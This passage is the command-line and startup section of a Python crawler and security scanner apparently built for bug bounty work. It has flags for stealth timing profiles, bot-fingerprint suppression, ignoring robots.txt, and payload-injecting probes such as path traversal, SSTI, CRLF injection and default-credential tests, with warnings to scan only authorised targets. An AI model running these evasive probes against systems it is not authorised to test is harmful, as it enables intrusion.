                        help="Stealth profile: LOUD (fast, default), NORMAL (moderate delays), GHOST (slow, randomised)")
    parser.add_argument("--bug-bounty-header", type=str, default=None,
                        help="Value for X-Bug-Bounty header e.g. 'HackerOne-chr0nic'. Omit to disable.")
    parser.add_argument("--active-probes", action="store_true",
                        help="Enable payload-injecting checks: path traversal, SSTI, CRLF injection, "
                             "CORS evil-origin probes, default credential tests, and dangerous HTTP method testing. "
                             "Only use against targets you are authorised to test.")
    parser.add_argument("--min-workers", type=int, default=1,
                        help="Minimum adaptive concurrency workers (default: 1)")
    parser.add_argument("--max-workers", type=int, default=10,
                        help="Maximum adaptive concurrency workers (default: 10)")

    args = parser.parse_args()

    STEALTH_PROFILE = args.stealth
    if STEALTH_PROFILE != "LOUD":
        print(f"[*] Stealth profile: {STEALTH_PROFILE}")

    BUG_BOUNTY_HEADER = args.bug_bounty_header
    if BUG_BOUNTY_HEADER:
        print(f"[*] Bug bounty header enabled: X-Bug-Bounty: {BUG_BOUNTY_HEADER}")

    ACTIVE_PROBES = args.active_probes
    if ACTIVE_PROBES:
        print("=" * 60)
        print("[!] WARNING: Active probes enabled.")
        print("[!] Payload-injecting checks are ON:")
        print("[!]   path traversal, SSTI, CRLF injection,")
        print("[!]   CORS evil-origin probes, default credential tests,")
        print("[!]   dangerous HTTP method testing (TRACE/PUT/DELETE/CONNECT)")
        print("[!] Only scan targets you are authorised to test.")
        print("=" * 60)

    if args.rate_min:    RATE_LIMIT_MIN = args.rate_min
    if args.rate_max:    RATE_LIMIT_MAX = args.rate_max
    if args.concurrency: MAX_CONCURRENT = args.concurrency
    if args.no_social:
        SOCIAL_FILTER_FLAGS["enabled"] = True
        print("[*] Social media filter enabled — skipping Facebook, X, YouTube, LinkedIn, etc.")
    if args.no_skip_google_tracking:
        SKIP_GOOGLE_TRACKING = False
        print("[*] Google tracking filter disabled — Play Store and analytics URLs will be crawled")
    if args.playwright:
        PLAYWRIGHT_FLAGS["enabled"] = True
        if not PLAYWRIGHT_AVAILABLE:
            print("[!] Playwright not installed. Run: pip install playwright && playwright install chromium")
        else:
            print("[*] Playwright JS rendering enabled")
            if not PLAYWRIGHT_STEALTH_AVAILABLE:
                print("[!] playwright-stealth not installed — bot fingerprint suppression disabled. Run: pip install playwright-stealth")

    if args.Domain:
        main_crawler(args.Domain, same_domain_only=args.same_domain_only,
                     resume=args.resume, ignore_robots=args.ignore_robots,
                     min_workers=args.min_workers, max_workers=args.max_workers)
    else:
        print("\nUsage: ./main.py -D https://www.example.com\n")
        print("Optional flags:")
        print("  --rate-min 1.0          Min seconds between requests")
        print("  --rate-max 3.0          Max seconds between requests")
        print("  --concurrency 5         Max concurrent async requests (legacy; use --max-workers)")
        print("  --min-workers 1         Minimum adaptive concurrency workers")
        print("  --max-workers 10        Maximum adaptive concurrency workers")
        print("  --same-domain-only      Stay on the starting domain only")
        print("  --resume                Resume from last saved state")
        print("  --playwright            Enable JS rendering via Playwright")
        print("  --no-social             Skip social media domains (Facebook, X, YouTube, etc.)")
        print("  --stealth LOUD|NORMAL|GHOST  Stealth profile (default: LOUD)\n")

